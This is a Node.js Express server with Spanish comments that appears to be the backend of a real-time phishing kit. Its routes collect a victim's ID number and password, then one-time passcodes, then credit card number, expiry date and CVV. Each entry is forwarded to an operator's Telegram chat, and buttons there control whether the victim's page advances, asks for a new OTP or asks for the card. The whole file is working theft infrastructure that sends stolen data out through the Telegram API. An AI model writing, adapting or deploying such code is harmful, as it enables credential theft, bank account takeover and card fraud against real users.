const express = require('express');
const axios = require('axios');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const CHAT_ID = process.env.TELEGRAM_CHAT_ID;
const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}`;

// Memoria temporal para guardar el estado
const transacciones = {};
const otps = {};
const tcs = {};

// --- RUTAS ---

// 1. Flujo Inicial (Inicio)
app.post('/api/solicitar-acceso', async (req, res) => {
    const { documento, clave } = req.body;
    if (!documento || !clave) return res.status(400).json({ status: 'error' });

    const transaccionId = Date.now().toString();
    transacciones[transaccionId] = { estado: 'pendiente' };

    const mensaje = `🔔 *Nueva Solicitud de Acceso*\n\n📄 Documento: \`${documento}\`\n🔑 Clave: \`${clave}\`\n\n¿Permitir el acceso?`;

    try {
        await axios.post(`${TELEGRAM_API}/sendMessage`, {
            chat_id: CHAT_ID,
            text: mensaje,
            parse_mode: 'Markdown',
            reply_markup: {
                inline_keyboard: [[
                    { text: '✅ Aceptar', callback_data: `aceptar_${transaccionId}` },
                    { text: '❌ Rechazar', callback_data: `rechazar_${transaccionId}` }
                ]]
            }
        });
        res.json({ status: 'ok', id: transaccionId });
    } catch (error) {
        res.status(500).json({ status: 'error' });
    }
});

app.get('/api/verificar-estado/:id', (req, res) => {
    res.json(transacciones[req.params.id] || { estado: 'no_encontrada' });
});

// 2. Flujo OTP
app.post('/api/validar-otp', async (req, res) => {
    const { documento, clave, otp } = req.body;
    const otpId = Date.now().toString();
    otps[otpId] = { estado: 'pendiente' };

    const mensaje = `🔐 *Validación OTP*\n\n📄 Documento: \`${documento}\`\n🔑 Clave: \`${clave}\`\n🔢 OTP: \`${otp}\`\n\n¿Qué desea hacer?`;

    try {
        await axios.post(`${TELEGRAM_API}/sendMessage`, {
            chat_id: CHAT_ID,
            text: mensaje,
            parse_mode: 'Markdown',
            reply_markup: {
                inline_keyboard: [[
                    { text: '✅ Aceptar', callback_data: `otp_aceptar_${otpId}` },
                    { text: '❌ Error', callback_data: `otp_error_${otpId}` },
                    { text: '💳 Pedir TC', callback_data: `otp_tc_${otpId}` }
                ]]
            }
        });
        res.json({ status: 'ok', id: otpId });
    } catch (error) {
        res.status(500).json({ status: 'error' });
    }
});

app.get('/api/verificar-otp/:id', (req, res) => {
    res.json(otps[req.params.id] || { estado: 'no_encontrada' });
});

// 3. Flujo Tarjeta de Crédito (TC)
app.post('/api/validar-tc', async (req, res) => {
    const { numero, fecha, cvv } = req.body;
    const tcId = Date.now().toString();
    tcs[tcId] = { estado: 'pendiente' };

    const mensaje = `💳 *Datos Tarjeta de Crédito*\n\n💳 Número: \`${numero}\`\n📅 Fecha: \`${fecha}\`\n🔒 CVV: \`${cvv}\`\n\n¿Permitir el pago?`;

    try {
        await axios.post(`${TELEGRAM_API}/sendMessage`, {
            chat_id: CHAT_ID,
            text: mensaje,
            parse_mode: 'Markdown',
            reply_markup: {
                inline_keyboard: [[
                    { text: '✅ Aceptar', callback_data: `tc_aceptar_${tcId}` },
                    { text: '❌ Rechazar', callback_data: `tc_rechazar_${tcId}` }
                ]]
            }
        });
        res.json({ status: 'ok', id: tcId });
    } catch (error) {
        res.status(500).json({ status: 'error' });
    }
});

app.get('/api/verificar-tc/:id', (req, res) => {
    res.json(tcs[req.params.id] || { estado: 'no_encontrada' });
});

// 4. WEBHOOK (Recibe todas las acciones de Telegram)
app.post('/telegram-webhook', async (req, res) => {
    const { callback_query } = req.body;
    if (callback_query) {
        const data = callback_query.data;
        const partes = data.split('_');
        const tipo = partes[0]; // aceptar, rechazar, otp, tc
        let id = '';
        let accion = '';

        // Lógica para saber qué ID buscar según el botón presionado
        if (tipo === 'aceptar' || tipo === 'rechazar') {
            id = partes[1];
            accion = tipo;
            if (transacciones[id]) transacciones[id].estado = accion === 'aceptar' ? 'aceptado' : 'rechazado';
        } else if (tipo === 'otp') {
            accion = partes[1]; // aceptar, error, tc
            id = partes[2];
            if (otps[id]) otps[id].estado = accion;
        } else if (tipo === 'tc') {
            accion = partes[1]; // aceptar, rechazar
            id = partes[2];
            if (tcs[id]) tcs[id].estado = accion === 'aceptar' ? 'aceptado' : 'rechazado';
        }

        try {
            // Responder a Telegram (quita el relojito)
            await axios.post(`${TELEGRAM_API}/answerCallbackQuery`, {
                callback_query_id: callback_query.id,
                text: `Acción registrada: ${accion}`
            });

            // Editar el mensaje SOLO para añadir el estado al final, sin borrar los datos originales
            const textoOriginal = callback_query.message.text;
            const textoNuevo = `${textoOriginal}\n\n👉 *Acción tomada:* ${accion.toUpperCase()}`;

            await axios.post(`${TELEGRAM_API}/editMessageText`, {
                chat_id: callback_query.message.chat.id,
                message_id: callback_query.message.message_id,
                text: textoNuevo,
                parse_mode: 'Markdown',
                reply_markup: { inline_keyboard: [] } // Quitamos los botones para que no se pueda volver a presionar
            });
        } catch (e) { console.error(e.message); }
    }
    res.sendStatus(200);
});

app.listen(PORT, () => console.log(`Servidor corriendo en ${PORT}`));
